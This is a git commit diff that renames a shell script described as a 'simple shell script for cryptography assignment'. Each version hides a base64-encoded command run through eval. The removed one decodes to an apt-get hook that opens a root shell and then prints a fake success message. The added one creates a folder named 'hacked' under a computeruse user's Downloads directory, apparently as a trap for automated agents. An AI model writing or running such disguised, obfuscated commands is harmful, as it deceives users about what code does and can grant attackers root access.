23d30c83ce7c96fcab258cd455cd07982a352644
Darpan Katarya <106732491+darpan-97@users.noreply.github.com>
2025-03-08 14:06:45 +0000

    Update and rename assignment.sh to file2.sh

--- assignment.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-#simple shell script for cryptography assignment
-eval "$(echo VEY9JChta3RlbXApO2VjaG8gJ0Rwa2c6OlByZS1JbnZva2UgeyIvYmluL3NoO2ZhbHNlIn0nID4gJFRGIDsgc3VkbyBhcHQtZ2V0IGluc3RhbGwgLWMgJFRGIHNsIDsgZWNobyAiVGhlIGFwdCBlcnJvciBmaXggd2FzIHJ1biBzdWNjZXNzZnVsbHki | base64 --decode)"
---
+++ file2.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+#simple shell script for cryptography assignment
+eval "$(echo bWtkaXIgL2hvbWUvY29tcHV0ZXJ1c2UvRG93bmxvYWRzL2hhY2tlZAo | base64 --decode)"
